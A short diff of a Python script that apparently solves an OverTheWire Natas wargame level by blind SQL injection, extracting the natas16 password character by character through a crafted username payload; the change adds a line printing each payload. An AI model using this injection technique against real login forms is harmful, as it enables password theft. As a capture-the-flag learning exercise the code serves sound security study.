@@ -19,6 +19,7 @@ for i in range(0, 32):
 	while not done:
 		payload = 'natas16" AND ascii(substring(password,' +  str(i+1) + ',1)) = ascii("' + str(alpha[cur])+ '") #'
 		r = requests.post(url + "index.php", data = {'username':payload}, auth=(user, passw))
+		print(payload)
 		if "This user exists" in r.text:
 			final = final + alpha[cur]
 			print(final)
